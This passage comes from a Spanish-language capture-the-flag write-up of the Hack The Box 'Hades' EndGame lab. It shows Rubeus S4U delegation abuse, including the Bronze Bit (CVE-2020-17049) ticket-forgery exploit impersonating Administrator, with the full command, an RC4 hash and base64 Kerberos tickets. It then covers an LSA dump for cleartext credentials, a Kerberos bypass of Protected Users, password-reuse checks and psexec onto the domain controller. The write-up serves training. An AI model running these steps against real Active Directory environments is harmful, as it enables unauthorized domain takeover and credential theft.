[*] Building S4U2self request for: 'ruycr4ft-pc$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Got a TGS for 'lee' to 'ruycr4ft-pc$@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIEoDCCBJygAwIBBaEDAgEWooIDyDCCA8RhggPAMIIDvKADAgEFoQsbCUhUQi5MT0NBTKIZMBegAwIB
      AaEQMA4bDHJ1eWNyNGZ0LXBjJKOCA4swggOHoAMCARehAwIBAaKCA3kEggN1Te9EZAPppzGvfOtjW+R1
      nkUZjWlbgxD86QUfn/68sPSfb0v42aVPw4VuVdrLhdtMMi/5hYiNwnzYLUQS8hT7JNSmxj84l+MJcPrR
      oz5L5mPg2+6bSqz1KLMfpahOb3nPjfJD/x8HYt6f/SF5E1hEuAfamAthVga5HJbymLRLxoVI9IFeb+ns
      kiHjX3/FS8gWI412sqQDi26ZeWHg47uF/VIRDcxwFi8BzRvgiMYqGlbPwMeQkuHgkq5P4PesSB5jfDsX
      Y8w9GlD/JPoCVkoew7/9Rvj31o8CTMiwo6SFsF0AQSrnj8x6ALryiazN0aepQMOUdMOQV8g5YMld1o5y
      QN8qZ4HEQb8mIP54tZfIcBqUQMoBNNvOMqelKVzOCeDTdg1zcSIkBKmryBy+zmAA9L1F2PQfEzB+ySTa
      DbNWA02a0BzUnm9R33NRDgVKzyNcbQTwl4Ws3DLoLFhZV8xg/bgWKIbPLf0iZXt+wqlJ25nTp8gAbt8O
      Fc1RWcasOaeijPtvusBHpe17KFLnAN1I911yXd0a2TAQacmnADnJD1vffQT3zqsvRDDkgBvAWvTLk67F
      x3SGzX45Wcccw4XfsqXH/dMOFjX0e7w6rP6V38c8RNAiEXth8ojiqztS1jlkBjthC3buiYg2l1T8+EMj
      r/D+qPqbgZSiEasCAlo9GXmyTxqKadY3zpLnIy9RSYPBwjkY3KJziX8L4UFvie2y/9NqhOKfdWrGkqOE
      Q3NhL4j/StoJ4X2Pw1FdeTWF7cYu+9aHEBZdfJT6Qxordu/skXSqnPT4NNAfhxlOo0cGqU+1xqioDPg8
      YY6csxBegxLQkxBaRx9ImdAGD5zPQATfPzxV5z8TwBHEVUhbvt5kGEM1ltUhQnPEOS6jifM3VAXvzzdv
      +ZFciJaKJXUZ7s+dMK5kkVrZTCLeIO0UNwkJ3LSwBtVimGFl0CvSwAWBokqzRCp+NJbbcCUuktoTSjKJ
      LC43FoKAAfDIg755tNYwHwnjiJvT99iVebmbGpiQYni+W5CKd+VYPAMmhv1TW4g4RhBVVIZMZYwEqx7r
      ErQyIstFS+klg7EZ71BkXG6uWL9Dwn1M46xGw8dHQbqqCJpW7f1vogVSc5yiJavURqBDF27idEuoNUoh
      yVaNZnyU6i59ksV2/QzD4Ohj/Kk323A+P0acjETNo4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakw
      gaagGzAZoAMCARehEgQQzx0G01zAVvs+B+vSzyy2IaELGwlIVEIuTE9DQUyiEDAOoAMCAQqhBzAFGwNs
      ZWWjBwMFAAChAAClERgPMjAyMzA4MDExMjA0MzRaphEYDzIwMjMwODAxMjIwNDM0WqcRGA8yMDIzMDgw
      ODEyMDQzNFqoCxsJSFRCLkxPQ0FMqRkwF6ADAgEBoRAwDhsMcnV5Y3I0ZnQtcGMk

[*] Impersonating user 'lee' to target SPN 'http/web.htb.local'
[*] Building S4U2proxy request for service: 'http/web.htb.local'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/web.htb.local':

      doIFUjCCBU6gAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQsbCUhUQi5MT0NBTKIgMB6gAwIB
      AqEXMBUbBGh0dHAbDXdlYi5odGIubG9jYWyjggQvMIIEK6ADAgESoQMCAQmiggQdBIIEGaqDhDQyos0F
      exia1XEWQzjfEZIMGmWih9kfWvjOXg0WZxhS6slB/4qYu2uwHrmBXdlR+BvATiMoNq8R+SZ0HXoCMIO1
      FVe0+5Xje3Z4NjbqPCHlE25UezmbdIZDXHQGCs0ZGZNklqjYfbBW56mOJmrTkIZdKs1zfYs40RQj2d14
      03cQ3FB0RqVScRW8+c4NLi4bfUY4D9MA8aYE2sOrrR/zL3zmCS7ftoCh2XkieF2LBuC0ZNfMNLoRZXLr
      f0fBNaIbX7SS696GrSIWsxg8CiblLSgCGxdoElQ465LzTVlwGamPJ2g9+FgHJ3DItSdqRfH4uOSqMQyB
      dcAq3PmYmXMGrY3j7IdLK5bgBemKQsNpdTDHkpxWHvvNs7SrEoq2oK0J1rUDDzG0dXMF792EqJaXl80v
      Rg7/7AmR8vAv0U2oA2TLIqKthBDyaG1HPGMc4g4zurDvMuHt/6eGKS/Alc9t1l0f5Qcls7FPr49Un62C
      jBNjD9wFDgz96jaqXd2KsF87DGV/Zbz4N0yTucPUeMxWP1FS956WtO8CLMXG9Zh8wSOEZ+hYa/T0tMdG
      vlSarN/zyHBNLsebBfXbWDt+638n0q4/7hVXfvEm/ONctszjdFlWYFQBKzwaBCmqBP7csXz4jzYOkeIP
      /4sQ5ppqPERP7xDMLHjKHnzqr9Ux9P+rRC5T+X5LMOqkIYakC1i3EWG9hcoAfso9t2/n2kxkK6nXvWR7
      7GDQYokmp1aXbGgwg3fvdt9s1y4V+FOb7ZOy8Uj5/EMhDEti1zYC16bnlPq38jNqfJFbyJv8OZ/lhleU
      fs93aDVixGiDQStkjbMFJ/1YZtEHn/e+Pc24Au2/437agMTacI9nFgH+pre9ib2aGW/C+B8x2o/419rv
      97op0KSI8AJMzOTavrKbpC4umS2J8KCz5KLLinbEw8kIYV+ZQE9Rt1ZwVkOwdIH6PydLyeIkCxbCeDcw
      zETMalJSLA2DL9VDGiQz8KJAIKvYWLMFyOMjnJUdDZLrF0CsCH8y6pp7rbJMOzPmHuramNoBy/05ETjD
      sJxN2/4eILMgmN5kkQVdgovNU+87t8Gn8QBCy27HnLmWVy/9502VJy4ivmfdGuEfgLYMYe7KlALzsIIG
      aCjo0YaCVosfPRhaX1W0T2aRpyNSh6a+goKnENKV2y/2WGy7Fg/TFHrjbTB4rLG+CzwSt9qjdTc2S0+O
      cdED4qVMCeN0ydwB/uvtUALbHYbWvlEY8dgIayQfVnCl/2kdtDEx2AxMj4DCvqFIcbs6J4GoPWO3pU1B
      knA+GFA8W2hocKcdtZF2z/PVdNol+Foz0+2we0fPCE/aVkWBC6VOB+eDYn80tsXwCFyAqv1J45yVcpxb
      iWhV7N6mLal04ZsYdfL1R/BNNCy0o4HKMIHHoAMCAQCigb8Egbx9gbkwgbaggbMwgbAwga2gGzAZoAMC
      ARGhEgQQUNtRQYwF27C1yPl1gOVWw6ELGwlIVEIuTE9DQUyiEDAOoAMCAQqhBzAFGwNsZWWjBwMFAECh
      AAClERgPMjAyMzA4MDExMjA0MzRaphEYDzIwMjMwODAxMjIwNDM0WqcRGA8yMDIzMDgwODEyMDQzNFqo
      CxsJSFRCLkxPQ0FMqSAwHqADAgECoRcwFRsEaHR0cBsNd2ViLmh0Yi5sb2NhbA==
[+] Ticket successfully imported!
PS C:\ProgramData> 
```

Sin embargo, si intentamos acceder a la web desde nuestro navegador nos va a decir que pa' tu casa:

![](/assets/img/hades/58.png)

Pero tiene sentido ya que no tenemos el ticket que hemos conseguido con Rubeus en nuestro navegador... lo tenemos en la powershell. Si tratamos de ver el código de estado, ¡vemos un 200! Osea que desde la PowerShell sí podemos ver la web:

![](/assets/img/hades/59.png)

Ahora me voy a descargar el index.html para luego descargarlo en mi máquina y ver como se ve la web:

![](/assets/img/hades/60.png)

Bueno, intentando copiar el output.html a un servidor de SMB nos dice que no podemos. Como no me quiero complicar la vida, voy a meterme en una sesión de WinRM como administrator e ir a la ruta donde se encuentra el archivo que me quiero descargar:

![](/assets/img/hades/61.png)

Ahora si trato de montar un servidor python y acceder al output.html vemos cositas interesantes:

![](/assets/img/hades/62.png)

Y bueno, si validamos las credenciales con `crackmapexec` podemos ver que son válidas en WinRM así que nos podemos conectar:

![](/assets/img/hades/63.png)

## Escalada de privilegios
---
En esta parte del EndGame hice una vía no intencionada, ya que la intencionada que era por `Wireshark` no conseguía hacerla funcionar. Esta vía tiene que ver con lo que hicimos antes. Recordáis que intentando solicitar un ticket para administrator nos daba un error? Bueno, hay un CVE (este en concreto [CVE-2020-17049](https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/)) que nos permite falsificar el ticket. No nos tenemos que complicar más la vida, ya que Rubeus contempla este exploit con el parámetro `/bronzebit`. Así que, volvamos a la máquina DEV para explotar esto. Espero que no hayáis cerrado cerrado esa shell, si no toca volver a crear la variable `$cred`, nada del otro mundo:

```shell
PS C:\ProgramData> .\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:Administrator /msdsspn:cifs/web.htb.local /domain:htb.local /ptt /nowrap /bronzebit
.\Rubeus.exe s4u /user:ruycr4ft-pc$ /rc4:9BDAE32322748193C95B6C64341FE895 /impersonateuser:Administrator /msdsspn:cifs/web.htb.local /domain:htb.local /ptt /nowrap /bronzebit

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 

[*] Action: S4U

[*] Using rc4_hmac hash: 9BDAE32322748193C95B6C64341FE895
[*] Building AS-REQ (w/ preauth) for: 'htb.local\ruycr4ft-pc$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE6DCCBOSgAwIBBaEDAgEWooIEAjCCA/5hggP6MIID9qADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4IDwDCCA7ygAwIBEqEDAgECooIDrgSCA6qFBlMXKmza8T//aBtDKIUnIyAHEDuPct6SApR3NoAJjpOR4LOP9OIRc2XwN9j3LswEn+loEDalDLg4IM1eEZVXMVcivOdNGG9U6ZQVeySeI8kcLKcReiKwsnTqiVOzt2Wjic8tNhgNQzBmqKjMicNgbO61nOv1cU6jv4KvmpCkv+I4yXv1qHWRQ/Mo+s//pjJDpAUyyBu2L9TnTjeGwg6a0Z1KISJZ7HPPk0Ih56YliOr7/ptENLCtaXAyE3onHPzhRqFxb1DlO1jCva2u2Ns84qJKA0La85ZR5yCGkdNmsMKs6ZFgZ0Aer5S/ZjYgdsOxcdOreqUilXf+U4A7EjJG/dOXf/lZa6X+8g6OijED6ti5jIlgdYZUcTkUN5ABxxmYMwbOfulnU+oQmNsK+IOp17xK8MrS06E7+6lkk7MfEXvPv+eyC7wPXNjnV/0PhXXruakzORSgs7rtD0OZrNdYoV/IxNNglauCS3KJ9vT9DAgUIu7r3dOMR0lRy8MixN+byRFv+Tt+oQeltbRO6QrUfRKgmyb6fkFWtocNN3ukD92prAIlLKF/vR2aHPbBhIT0O+tkBnFn9cyMSNC3Pd+kw68qsxFMHgZVpwUb6s8aCKmE88ylIR4sqPyq2YZbS/Y4ZL5F71Hw9niVaREll9o41ijG5ATmcfnulLPGJ2Y/67sd8XY3qi/H/Jd4lUjTqLvGpKQLNrF7NQMuCKYkY3JMBK98N6M9G9EuoFXgqHOLi4kOU1/VhqBew1nn3HgvNByCE/dQX5gIzA3S/yv1+J4DhC65xkm0zaS/L7OF5SByVVi4TrPQosOp3TUT50zKRwk7d4Qk94s0n8VQwsbj2T2YarQYgbRlGfonH4Zmif+rc/83NXTmsjRE8dCcOOAEQX3WMFJhjnb4kQiknm6oE+B9yCGMHTj60tw+diFQIz5fc7YS4X2eBvf3NE1bTS4AVFG1IB4EedmTiqSoOksRmtXMb09nIcXSvEzRR26M6MSauNJE+e9ZoJygxmNzpqoMSxn7QhCbBgXVJXKEE26BmDtnlL2zaaWKRE3Nyzj/UpqozxByaLoEzO2wmAZ5AphepYfkWUkCagRI77/JnoUXHS4uKR5m1hlthNnyKztLSSxovPCtft2Mb7qNjbIj5atlSewm+6/dMRguFo3uqi8DvqhFRjAc43blrbMnU37DjVhRl36oHgF1lbetVww1hrukaIGhkdMRJwtY8In/zSyyEiqt96/phsaZ8vycc6OB0TCBzqADAgEAooHGBIHDfYHAMIG9oIG6MIG3MIG0oBswGaADAgEXoRIEEHCYOXpxadE6CYxRGQcwb2WhCxsJSFRCLkxPQ0FMohkwF6ADAgEBoRAwDhsMcnV5Y3I0ZnQtcGMkowcDBQBA4QAApREYDzIwMjMwODAxMTUwMDA3WqYRGA8yMDIzMDgwMjAxMDAwN1qnERgPMjAyMzA4MDgxNTAwMDdaqAsbCUhUQi5MT0NBTKkeMBygAwIBAqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'ruycr4ft-pc$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Bronze Bit flag passed, flipping forwardable flag on. Original flags: name_canonicalize, pre_authent, renewable
[*] Flags changed to: name_canonicalize, pre_authent, renewable, forwardable
[*] Got a TGS for 'Administrator' to 'ruycr4ft-pc$@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIFPDCCBTigAwIBBaEDAgEWooIEWjCCBFZhggRSMIIETqADAgEFoQsbCUhUQi5MT0NBTKIZMBegAwIBAaEQMA4bDHJ1eWNyNGZ0LXBjJKOCBB0wggQZoAMCARehAwIBAaKCBAsEggQHLdwwvrJjbkHkIjmEt3ms6EoRZPu4Mjgh0PmhBNzTPW7AGTmY/dgZ6mOGH15c2mghNRlQINTprpkLxybwXlToMcrjWRZ9u/5ufIrXwawPZ1ZTSkcHMsmTbownXXgzfEFG7Wv9kTcV0+xsiZwqmdcbndCOtOAThOEYvsbzTCi7gdy5DXNWAPjh5zW6h+481zAUqUZBdx9EOn/H7oh+IkjZjcOTgyNuYflVAMKHfodo5xxDUsWg7+aUjEetCNAccVFTkzqM6bfaJNlLslE7bNQFDikWMCQFjB9nHjI9hHfBCQOHz4oOFmE2s/qB0tLhKffH7qEDLjzUClrUzCK/cPm2EJHN8/C7CIU6/mGHFhrzdGJ2AsIfHf0AY96qtBG8qLrRoBmYCr3ETM/XDBuamvxfT+TfaOwV/faUlBG8s02tGL7DTnoRFIsiDyd0pYWUdkk2h5Ua2sdsmxdQ/WYLJbnhB7DJTieQT+Z2X056j1a6brf8FTj3j3lpVnBmW5KHN7ZWX557mbLlL2BItBSx7cMWLR24YDW7bUUCTRNoaVjd4hh5FZj/9hoPW8Peu+m8qstRzUyvOs0yHqWl3qtK4cjTMYu1e5e/wf0WjtlfJOembV2EPSR/9zyxqSHULe97hhPzIhrpvOO7MmlP1d0lEUDMuUfVgm5fGyYZ98/ADfpsy33P3AIaHMRiqUZ62k08M5YmgFZSEfFnQvXAEYnPlZhKnMvNUb2zY1VW9/9xii0J6KIN8mdxtnJ3WLOjdR3Hkilc2CIwThevHQn12dL2/sOZt4CQWENEju8EWQFpjKa1w+KpLKG73FnEh5033ho1jdy9A39Eemzgb5bQB/jNslKyUeTQJwJabcafu5zOcWYjLyG04whJuzOH9eex7vm9ClpHI66YRx/ogJ1yilTelDz06vZDExj7pIfe/1dnP9vyKQavXw6AAMjlw6JSNi0OUcdwGBOGKFODYfH3jnVjVYnMdNyCJuqwfQF70+b1sKaYFWywkVddvKfMfzBu+mdkC117zjrPrKHBADTrrP6c3D4xmFIDhiaWBiPMFBzOjp4cHCkkIqUMTW7a7r+6GX/SjkJRwEBeXtH3KBJpygq9bf/c4EjzhSFDRTc+f/w/0hJej/E2vkeVzg0Z8+ifLR57iDBHeMiQaIoUD/rrWLSoxfDx1EwHkWH5AAusiKsIySOU9JQfn2DTFO+1XtbK8976IKhwLpVgogFkCf+5vlGHgoeIxlgMVS0jeDVV9MLkQmPqWw8jM48n5GDU1qqM9NzzLfS1oGjZeSG5Wdq0PLCMupQHQbl312h9ZVsAywSDt6bvIh4lDQoNMAMZCfy7+tOrhXa0zm2s60kOZzpaEDa1myh48mSNb95WlG6jgc0wgcqgAwIBAKKBwgSBv32BvDCBuaCBtjCBszCBsKAbMBmgAwIBF6ESBBBV2JdctH5tbJvstZGdeBWMoQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyMzA4MDExNTAwMDdaphEYDzIwMjMwODAyMDEwMDA3WqcRGA8yMDIzMDgwODE1MDAwN1qoCxsJSFRCLkxPQ0FMqRkwF6ADAgEBoRAwDhsMcnV5Y3I0ZnQtcGMk

[*] Impersonating user 'Administrator' to target SPN 'cifs/web.htb.local'
[*] Building S4U2proxy request for service: 'cifs/web.htb.local'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/web.htb.local':

      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
[+] Ticket successfully imported!
PS C:\ProgramData> 
```

Ahora nos copiamos el ticket que nos ha dado `Rubeus`, y lo guardamos a un archivo `.kirbi`:

![](/assets/img/hades/67.png)

Luego usamos la herramienta `ticketConverter.py` y convertimos el `.kirbi` a un `.ccache`. Así podremos exportarlo a la variable `KRB5CCNAME` y dumpear el LSA, para poder ver la contraseña de administrator en texto claro:

![](/assets/img/hades/68.png)

![](/assets/img/hades/69.png)

Como somos administradores de esta máquina nos podemos conectar a WinRM.

![](/assets/img/hades/70.png)

Cuando consiga la vía intencionada no dudaré en actualizar este post...

# DC1
---
Ya en la recta final, espero que estéis disfrutando chic@s!

## Bypasseando "Protected Users" por SMB
---
Este EndGame está simulando una empresa, por lo que no sería raro que el administrador de IT de la empresa, sea el que ha gestionado todas las cuentas de administrator de los otros equipos. Esto me lleva a pensar que puede que se esté reutilizando la contraseña de web\administrator para dc1\administrator. Sin embargo al probar la autenticación, falla, pero no por que las credenciales sean inválidas:

![](/assets/img/hades/71.png)

Esto se debe principalmente a que el usuario administrator pertenece al grupo **Protected Users**:

![](/assets/img/hades/72.png)

Esto es crítico, por que como la restricción está aplicada en SMB (y en WinRM supongo), seguramente no la han aplicado por kerberos, por lo que con el parámetro `-k` nos saltamos la protección y vemos que la credencial es válida:

![](/assets/img/hades/73.png)

Si te preguntas que fué lo que me llevó a deducir que la contraseña se estaba reutilizando fué esto:

![](/assets/img/hades/74.png)

Todas daban el mismo error, pero era un error de cuentas protegidas, no de credenciales inválidas, por lo que con el parámetro `-k` podemos ver que se reutilizan en **todas** las cuentas de administrator:

![](/assets/img/hades/75.png)

Nos sale `Pwn3d!` en todas menos en la DEV, que si recordáis administrator no tenía capacidad de escritura ni en C$ ni en ADMIN$. Sabiendo esto, podemos usar `psexec.py` (ya que WinRM estará chapado) para conectarnos a DC1.HTB.LOCAL:

![](/assets/img/hades/76.png)

# Conclusiones
---
https://www.hackthebox.com/achievement/endgame/1253217/3 Al fin!
Si queréis mi opinión sobre el EndGame, quiero decir que me ha parecido muy chulo, largo pero chulo. Creo que lo de que las conexiones a la máquina linux se calleran todo el rato era a posta para que te automatizaras la intrusión en un script de python, pero bueno, yo no he tenido tanto problema. Han sido 3 días intensos! 
Nos vemos en la próxima!
